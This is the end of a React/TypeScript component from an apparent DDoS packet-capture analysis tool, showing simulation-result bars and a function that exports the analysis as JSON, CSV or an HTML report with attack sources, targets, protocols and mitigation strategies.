                          <div className="bg-red-500 h-full" style={{ width: `${simulationResults.cpuImpact}%` }}></div>
                        </div>
                        <p className="text-xs text-primary/60 mt-1">{simulationResults.cpuImpact}%</p>
                      </div>
                      <div>
                        <p className="text-xs text-primary/60 mb-2">BANDWIDTH USAGE</p>
                        <div className="w-full bg-secondary/30 rounded h-2 overflow-hidden">
                          <div className="bg-orange-500 h-full" style={{ width: `${simulationResults.bandwidthUsage}%` }}></div>
                        </div>
                        <p className="text-xs text-primary/60 mt-1">{simulationResults.bandwidthUsage}%</p>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

function exportReport(analysis: any, format: 'html' | 'json' | 'csv') {
  const timestamp = new Date().toISOString().split('T')[0]
  const fileName = `DDoS-Analysis-Report-${timestamp}`

  if (format === 'json') {
    const dataStr = JSON.stringify(analysis, null, 2)
    const dataBlob = new Blob([dataStr], { type: 'application/json' })
    downloadFile(dataBlob, `${fileName}.json`)
  } else if (format === 'csv') {
    let csv = 'PCAP Analysis Report\n'
    csv += `Generated: ${new Date().toISOString()}\n\n`
    csv += 'Overall Metrics\n'
    csv += 'Metric,Value\n'
    csv += `Total Packets,${analysis.overallMetrics?.totalPackets}\n`
    csv += `Suspicious Flows,${analysis.overallMetrics?.suspiciousFlows}\n`
    csv += `DDoS Confidence,${analysis.overallMetrics?.ddosConfidence}%\n`
    csv += `Attack Type,${analysis.overallMetrics?.attackType}\n`
    csv += `Risk Level,${analysis.overallMetrics?.riskLevel}\n\n`
    
    csv += 'Top Attacking Sources\n'
    csv += 'Source IP,Packets,Bytes,Ports,Attack Type\n'
    analysis.packetAnalysis?.trafficFlows?.topAttackingSources?.forEach((source: any) => {
      csv += `${source.ip},${source.packets},${source.bytes},"${source.ports?.join(';')}",${source.type}\n`
    })
    csv += '\nTarget Servers\n'
    csv += 'Target IP:PORT,Packets,Bytes,Protocol,Severity\n'
    analysis.packetAnalysis?.trafficFlows?.targetServers?.forEach((target: any) => {
      csv += `${target.ip}:${target.port},${target.packets},${target.bytes},${target.protocol},${target.severity}\n`
    })

    const dataBlob = new Blob([csv], { type: 'text/csv' })
    downloadFile(dataBlob, `${fileName}.csv`)
  } else if (format === 'html') {
    let html = '<!DOCTYPE html>\n<html>\n<head>\n'
    html += '<meta charset="UTF-8">\n'
    html += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
      html += '<title>PCAP Analysis Report</title>\n'
    html += '<style>\n'
    html += 'body { font-family: monospace; background: #0a0a0a; color: #00ff00; margin: 0; padding: 20px; }\n'
    html += '.container { max-width: 1200px; margin: 0 auto; }\n'
    html += 'h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #00ff00; padding-bottom: 10px; }\n'
    html += '.metrics { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }\n'
    html += '.metric-card { background: #111; border: 1px solid #00ff00; padding: 15px; border-radius: 5px; }\n'
    html += '.metric-label { color: #00aa00; font-size: 0.8em; }\n'
    html += '.metric-value { font-size: 1.5em; color: #00ff00; font-weight: bold; }\n'
    html += 'table { width: 100%; border-collapse: collapse; margin: 20px 0; }\n'
    html += 'th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; }\n'
    html += 'th { background: #001a00; color: #00ff00; }\n'
    html += 'tr:nth-child(even) { background: #0d0d0d; }\n'
    html += '.critical { color: #ff0000; }\n'
    html += '.high { color: #ff6600; }\n'
    html += '.footer { margin-top: 30px; text-align: center; color: #00aa00; font-size: 0.8em; }\n'
    html += '</style>\n</head>\n<body>\n'
    html += '<div class="container">\n'
      html += '<h1>PCAP ANALYSIS REPORT</h1>\n'
    html += `<p>Generated: ${new Date().toLocaleString()}</p>\n`
    html += '<h2>OVERALL METRICS</h2>\n'
    html += '<div class="metrics">\n'
    html += '<div class="metric-card"><div class="metric-label">Total Packets</div>'
    html += `<div class="metric-value">${analysis.overallMetrics?.totalPackets || 0}</div></div>\n`
    html += '<div class="metric-card"><div class="metric-label">Suspicious Flows</div>'
    html += `<div class="metric-value">${analysis.overallMetrics?.suspiciousFlows || 0}</div></div>\n`
    html += '<div class="metric-card"><div class="metric-label">DDoS Confidence</div>'
    html += `<div class="metric-value">${analysis.overallMetrics?.ddosConfidence || 0}%</div></div>\n`
    html += '<div class="metric-card"><div class="metric-label">Attack Type</div>'
    html += `<div class="metric-value">${analysis.overallMetrics?.attackType || 'UNKNOWN'}</div></div>\n`
    html += '<div class="metric-card"><div class="metric-label">Risk Level</div>'
    html += `<div class="metric-value critical">${analysis.overallMetrics?.riskLevel || 'UNKNOWN'}</div></div>\n`
    html += '</div>\n'
    
    html += '<h2>TOP ATTACKING SOURCES</h2>\n<table>\n'
    html += '<tr><th>Source IP</th><th>Packets</th><th>Bytes</th><th>Ports</th><th>Attack Type</th></tr>\n'
    analysis.packetAnalysis?.trafficFlows?.topAttackingSources?.forEach((s: any) => {
      html += `<tr><td>${s.ip}</td><td>${s.packets}</td><td>${s.bytes}</td><td>${s.ports?.join(', ')}</td><td class="critical">${s.type}</td></tr>\n`
    })
    html += '</table>\n'
    
    html += '<h2>TARGET SERVERS</h2>\n<table>\n'
    html += '<tr><th>Target IP:PORT</th><th>Packets</th><th>Bytes</th><th>Protocol</th><th>Severity</th></tr>\n'
    analysis.packetAnalysis?.trafficFlows?.targetServers?.forEach((t: any) => {
      const severityClass = t.severity === 'CRITICAL' ? 'critical' : 'high'
      html += `<tr><td>${t.ip}:${t.port}</td><td>${t.packets}</td><td>${t.bytes}</td><td>${t.protocol}</td><td class="${severityClass}">${t.severity}</td></tr>\n`
    })
    html += '</table>\n'
    
    html += '<h2>PROTOCOL BREAKDOWN</h2>\n<table>\n'
    html += '<tr><th>Protocol</th><th>Count</th><th>Percentage</th><th>Suspicious</th></tr>\n'
    Object.entries(analysis.packetAnalysis?.protocolBreakdown || {}).forEach(([proto, data]: any) => {
      html += `<tr><td>${proto}</td><td>${data.count}</td><td>${data.percentage}%</td><td>${data.suspicious}</td></tr>\n`
    })
    html += '</table>\n'
    
    html += '<h2>MITIGATION STRATEGIES</h2>\n'
    analysis.mitigationStrategies?.forEach((strat: any) => {
      html += `<h3>${strat.strategy} <span class="critical">[${strat.priority}]</span></h3>\n`
      html += `<p><strong>Implementation:</strong> ${strat.implementation}</p>\n`
      html += `<p><strong>Impact:</strong> ${strat.impact}</p>\n`
    })
    
    html += '<div class="footer">\n'
    html += '<p>PCAP Analysis Report - Confidential</p>\n'
    html += '<p>For security testing and defensive purposes only</p>\n'
    html += '</div>\n</div>\n</body>\n</html>'
    
    const dataBlob = new Blob([html], { type: 'text/html' })
    downloadFile(dataBlob, `${fileName}.html`)
  }
}

function downloadFile(blob: Blob, fileName: string) {
  const url = URL.createObjectURL(blob)
  const link = document.createElement('a')
  link.href = url
  link.download = fileName
  document.body.appendChild(link)
  link.click()
  document.body.removeChild(link)
  URL.revokeObjectURL(url)
}
